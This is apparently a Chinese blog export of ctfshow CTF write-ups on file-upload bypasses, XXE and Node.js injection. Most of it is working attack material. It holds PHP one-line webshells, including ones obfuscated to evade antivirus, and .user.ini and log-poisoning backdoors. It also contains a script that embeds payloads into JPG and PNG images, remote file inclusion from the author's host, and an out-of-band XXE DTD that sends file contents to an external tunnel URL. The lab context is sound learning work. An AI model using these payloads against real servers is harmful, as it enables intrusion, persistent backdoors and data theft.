<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/1.png</span><br></pre></td></tr></table></figure>

<p>创建一个1.png，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`tac ../f*`?&gt;</span><br></pre></td></tr></table></figure>

<p>过滤绕过，访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://4857c3f8-49e2-4795-9726-07bf02c02c5e.challenge.ctf.show/upload/</span><br></pre></td></tr></table></figure>

<p>即可看见flag</p>
<h2 id="web160-161"><a href="#web160-161" class="headerlink" title="web160,161"></a>web160,161</h2><p>日志包含上传文件1.png</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>创建一个**.user.ini.png**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=/var/www/html/upload/1.png</span><br></pre></td></tr></table></figure>

<p>上传，访问upload</p>
<p>抓包，修改ua</p>
<p>161增加gif86a</p>
<h2 id="web162163"><a href="#web162163" class="headerlink" title="web162163"></a>web162163</h2><p>远程文件包含</p>
<p>日志包含，把 <strong>.</strong> 给过滤了，传入的内容不能有点</p>
<p>在云主机上写入文件123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<p>开启http</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5000</span><br></pre></td></tr></table></figure>

<p>上传文件123.png,抓包改名为123</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF86A?</span><br><span class="line">&lt;?=include&quot;http://1697363581:5000/123&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>创建一个**.user.ini.png**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=123</span><br></pre></td></tr></table></figure>

<p>上传，访问upload</p>
<p>命令执行即可，写个马发现没有权限查看源码，不清清楚题目全貌</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#IP转换为长整型</span><br><span class="line">def ip2long(ip):</span><br><span class="line">    ip_list=ip.split(&#x27;.&#x27;) #⾸先先把ip的组成以&#x27;.&#x27;切割然后逐次转换成对应的⼆进制</span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(4): #0,1,2,3</span><br><span class="line">        result = result+int(ip_list[i])*256**(3-i)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">#长整型转换为IP</span><br><span class="line">def long2ip(long):</span><br><span class="line">    floor_list = []</span><br><span class="line">    num = long</span><br><span class="line">    for i in reversed(range(4)):</span><br><span class="line">        res = divmod(num,256**i)</span><br><span class="line">        floor_list.append(str(res[0]))</span><br><span class="line">        num = res[1]</span><br><span class="line">    return &#x27;.&#x27;.join(floor_list)</span><br><span class="line"></span><br><span class="line">print(ip2long(&#x27;127.0.0.1&#x27;))</span><br></pre></td></tr></table></figure>

<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p><strong>png图片二次渲染绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">    0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+1];</span><br><span class="line">    $b = $p[$y+2];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;2.png&#x27;);  //要修改的图片的路径</span><br><span class="line">/* 木马内容</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>生成一个木马图片马，上传，</p>
<p><img src="/2023/02/15/ctfshow%E5%90%88%E9%9B%86-ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/QQ%E6%88%AA%E5%9B%BE20230526170442.png"></p>
<p>下载生成的图片010打开即是flag</p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p><strong>jpg图片二次渲染绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $miniPayload = &quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">用法  php exp.php a.jpg</span><br></pre></td></tr></table></figure>

<p>未曾复现</p>
<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>传一个一句话压缩包即可</p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p><strong>.user.ini文件构成的PHP后门</strong></p>
<p>php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；</p>
<p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器</p>
<p>从被执行的 PHP 文件所在目录开始一直上升到 web 根目录</p>
<p><code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 11.php 文件头插入了 <code>require(&#39;1.jpg&#39;)</code> 这条语句，也就是说相当于文件包含。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //包含在文件头</span><br><span class="line">auto_append_file = &lt;filename&gt;          //包含在文件尾</span><br></pre></td></tr></table></figure>

<p><strong>.htaccess 配置文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>将所有文件都解析为 php 文件,只对该文件所在目录下的文件起作用。只在 Apache 服务器中起作用。</p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`tac ../flagaa.php`;</span><br></pre></td></tr></table></figure>

<p>免杀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;s#y#s#t#e#m&quot;;</span><br><span class="line">$b = explode(&quot;#&quot;,$a);</span><br><span class="line">$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</span><br><span class="line">$c($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_REQUEST[&#x27;a&#x27;];</span><br><span class="line">$b=$_REQUEST[&#x27;b&#x27;];</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>关键词 <code>layui</code> upload</p>
<p>前端验证必须是zip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;zip&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">			  &lt;i class=&quot;</span>layui-icon<span class="string">&quot;&gt;&amp;#xe67c;&lt;/i&gt;上传文件</span></span><br></pre></td></tr></table></figure>

<p>通过尝试&lt;&gt;被杀了</p>
<p>后端验证必须是png文件</p>
<p>-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”.user.zip”<br>Content-Type: application&#x2F;x-zip-compressed</p>
<p>创建一个压缩包.user.zip 记事本打开</p>
<p><code>auto_append_file</code> string</p>
<p>指定在主文件之后自动解析的文件名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_append_file=&quot;/var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure>

<p>即修改为 .user.ini</p>
<p>类型修改为image&#x2F;png</p>
<p>同时user-agent传入一句话木马</p>
<p>即可上传</p>
<p>同理同时，再上传一个1.php，内容随便</p>
<p>一剑连接upload&#x2F;1.php</p>
<p>在根目录下&#x2F;var&#x2F;www&#x2F;html&#x2F;下</p>
<p>auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中</p>
<p><a href="https://blog.csdn.net/weixin_53146913/article/details/124840296?ops_request_misc=%7B%22request_id%22:%22167645042416782429787891%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167645042416782429787891&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124840296-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=user.ini&spm=1018.2226.3001.4187">(13条消息) 【文件上传漏洞】user.ini留后门_菜菜zhao的博客-CSDN博客_.user.ini</a></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowxxe</title>
    <url>/2023/03/13/ctfshow%E5%90%88%E9%9B%86-ctfshowxxe/</url>
    <content><![CDATA[<p>   xxe</p>
<span id="more"></span>

<p><a href="https://blog.csdn.net/qq_63844103/article/details/128060556?ops_request_misc=%7B%22request_id%22:%22167868664316800182744486%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=167868664316800182744486&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-128060556-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=xxe&spm=1018.2226.3001.4187">(8条消息) 【web安全】——XXE漏洞快速入门_xxe漏洞利用_白昼安全的博客-CSDN博客</a></p>
<p><strong>内部实体就相当于自己编写DTD内容，而外部实体就相当于引入外部的DTD内容</strong></p>
<p>外部实体:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体的<strong>声明</strong>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code></p>
<p><strong>引用</strong>参数实体的方法：<code>%实体名称;</code></p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);   <span class="comment">//$dom第一个节点</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;     <span class="comment">//$creds节点的ctfshow</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>hackbar无法传参，只能bp传参,修改文本长度，随便长度即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;zhou&gt;   //根元素</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;   //子元素   引用一般实体的方法：&amp;实体名称</span><br><span class="line">&lt;/zhou&gt;</span><br></pre></td></tr></table></figure>

<p>关于simplexml_import_dom</p>
<p>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dom = new domDocument;</span><br><span class="line">$dom-&gt;loadXML(&#x27;&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">$xml = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;from;</span><br><span class="line">?&gt;</span><br><span class="line">//输出：John</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;&#x2F;flag        &#x2F;&#x2F;file协议</p>
<p><strong>DOM 节点</strong></p>
<p>根据 DOM，XML 文档中的每个成分都是一个<strong>节点</strong>。</p>
<p>DOM 是这样规定的：</p>
<ul>
<li>整个文档是一个文档节点</li>
<li>每个 XML 元素是一个元素节点</li>
<li>包含在 XML 元素中的文本是文本节点</li>
<li>每一个 XML 属性是一个属性节点</li>
<li>注释是注释节点</li>
</ul>
<h2 id="web374-376"><a href="#web374-376" class="headerlink" title="web374-376"></a>web374-376</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>没有echo</p>
<p>在网站下创建一个test.dtd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;https://384fb1c7.r2.cpolar.cn/xxe/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>创建一个接收$file的php文件，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://384fb1c7.r2.cpolar.cn/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span>   </span><br></pre></td></tr></table></figure>

<p>通过执行我网站下的dtd内容来访问我的网站，获得flag</p>
<p><code>ctfshow&#123;67b34bff-45b9-4935-bfb4-679f7fdd10b4&#125;</code></p>
<p>web375</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p><code>Content-Type: application/xml;charset=utf-8</code></p>
<p>抓包返回看类型可知xml提交参数</p>
<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></p>
<p>即可回显</p>
<p><code>ctfshow&#123;34c67ba7-bb24-4ac1-a485-c0e8c15dc550&#125;</code></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow nodejs</title>
    <url>/2023/03/14/ctfshow%E5%90%88%E9%9B%86-node-js/</url>
    <content><![CDATA[<p>​    ctfshow nodejs</p>
<p>Nodejs基于Javascript语言,<a href="http://hexo.io/">Hexo</a> 是一个简单地、轻量地、基于Node的一个静态博客框架.</p>
<p>​      <span id="more"></span></p>
<p><a href="https://nodejs.cn/">Node.js 中文网 (nodejs.cn)</a></p>
<h2 id="ctfshowweb334"><a href="#ctfshowweb334" class="headerlink" title="ctfshowweb334"></a>ctfshowweb334</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>toUpperCase() 方法将字符串小写字符转换为大写</p>
<p>name不等于CTFSHOW&amp;&amp;username&#x3D;&#x3D;大写name</p>
<p>password&#x3D;123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  items: [</span><br><span class="line">    &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>账号 ctfshow 密码123456</p>
<p>ctfshow{9f833d97-352c-48c1-960d-e865de36150a}</p>
<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout.toString();</span><br><span class="line">eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl00g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>

<p><strong>require导入模块</strong></p>
<p>child_process模块，通过child_process我们可以创建子进程</p>
<p><a href="https://nodejs.cn/api/child_process.html#child_processspawncommand-args-options">child_process 子进程 | Node.js API 文档 (nodejs.cn)</a></p>
<p>spawnSync</p>
<p><a href="https://blog.csdn.net/qq_24013171/article/details/80368731?ops_request_misc=%7B%22request_id%22:%22167879802016800215056609%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=167879802016800215056609&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-80368731-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=spawnSync&spm=1018.2226.3001.4187">(9条消息) Node.js 执行系统命令_node execsync 和 exec_风硕依源的博客-CSDN博客</a></p>
<p><code>stdout</code> 可以用于处理进程的输出</p>
<p>toString()将缓冲区对象显示为字符串</p>
<p>ctfshow{5ddb05d8-0267-4d06-8211-c90683eed82c}</p>
